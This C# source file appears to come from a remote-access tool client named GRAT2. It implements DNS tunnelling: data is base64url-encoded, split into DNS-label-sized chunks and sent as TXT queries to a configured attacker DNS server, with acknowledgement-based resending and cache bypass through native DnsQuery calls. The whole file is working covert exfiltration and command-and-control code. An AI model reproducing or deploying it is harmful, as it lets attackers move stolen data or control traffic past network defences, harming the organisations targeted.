using System;
using System.Collections;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;

namespace GRAT2_Client.PInvoke
{
    class DNSClient
    {
		// Credits to https://github.com/Arno0x/DNSExfiltrator
		private static string data = String.Empty;
		private static int chunkMaxSize;
		public static string request = String.Empty;
		public static string reply = String.Empty;

		public static int numberOfChunks(string command)
		{
			int nbChunks;

			byte[] ArrayData = Encoding.UTF8.GetBytes(command);
			data = Encryption.ToBase64URL(ArrayData);

			int requestMaxSize = Config.dnsMaxTXT;
			int labelMaxSize = Config.maxDNSChar;
			int bytesLeft = requestMaxSize - 10 - (Config.DNSServer.Length + 2);
			int nbFullLabels = bytesLeft / (labelMaxSize + 1);
			int smallestLabelSize = bytesLeft % (labelMaxSize + 1) - 1;
			chunkMaxSize = nbFullLabels * labelMaxSize + smallestLabelSize;

			return nbChunks = data.Length / chunkMaxSize + 1;
		}

		public static void SendChunk()
		{

			string chunk;
			int chunkIndex = 0;
			int countACK;

			for (int i = 0; i < data.Length;)
			{

				chunk = data.Substring(i, Math.Min(chunkMaxSize, data.Length - i));
				int chunkLength = chunk.Length;

				request = chunkIndex.ToString() + ".";

				int j = 0;
				while (j * Config.maxDNSChar < chunkLength)
				{
					request += chunk.Substring(j * Config.maxDNSChar, Math.Min(Config.maxDNSChar, chunkLength - (j * Config.maxDNSChar))) + ".";
					j++;
				}

				request += Config.DNSServer;

				try
				{
					reply = DnsResolver.GetTXTRecord(request);

					countACK = Convert.ToInt32(reply);

					if (countACK != chunkIndex)
					{
						Console.WriteLine(String.Format("[!] Chunk number [{0}] lost.\nResending.", countACK));
					}
					else
					{
						i += chunkMaxSize;
						chunkIndex++;
					}
				}
				catch (Win32Exception e)
				{
					Console.WriteLine(String.Format("[!] Unexpected exception occured: [{0}]", e.Message));
					return;
				}
			}
		}


		public class DnsResolver
		{

			public static string GetTXTRecord(string domain)
			{
				IntPtr recordsArray = IntPtr.Zero;
				IntPtr dnsRecord = IntPtr.Zero;
				IntPtr pExtra = IntPtr.Zero;
				flags.TXTRecord txtRecord;

				ArrayList recordList = new ArrayList();
				try
				{

					int queryResult = Interop.DnsQuery(ref domain, flags.DnsRecordTypes.DNS_TYPE_TXT, flags.DnsQueryOptions.DNS_QUERY_BYPASS_CACHE, pExtra, ref recordsArray, 0);
					if (queryResult != 0)
					{
						throw new Win32Exception(queryResult);
					}

					for (dnsRecord = recordsArray; !dnsRecord.Equals(IntPtr.Zero); dnsRecord = txtRecord.pNext)
					{
						txtRecord = (flags.TXTRecord)Marshal.PtrToStructure(dnsRecord, typeof(flags.TXTRecord));
						if (txtRecord.wType == (int)flags.DnsRecordTypes.DNS_TYPE_TXT)
						{
							string txt = Marshal.PtrToStringAuto(txtRecord.pStringArray);
							recordList.Add(txt);
						}
					}
				}
				finally
				{
					Interop.DnsRecordListFree(recordsArray, 0);
				}

				return (string)recordList[0];
			}

		}

	}
}
